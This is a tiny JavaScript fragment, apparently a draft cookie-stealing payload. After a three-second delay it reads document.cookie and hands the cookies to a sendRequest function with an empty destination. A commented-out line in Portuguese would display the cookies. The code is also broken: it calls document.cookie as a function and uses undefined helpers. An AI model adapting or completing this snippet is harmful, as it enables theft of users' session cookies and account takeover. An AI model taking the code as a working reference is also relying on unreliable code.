//prompt ("listando cookies:",document.cookie)


setTimeout(function() {
    var myCookies = document.cookie();
     
    if (!isEmpty(myCookies)) {
        sendRequest("", function() {}, myCookies); 
    }
}, 3000);

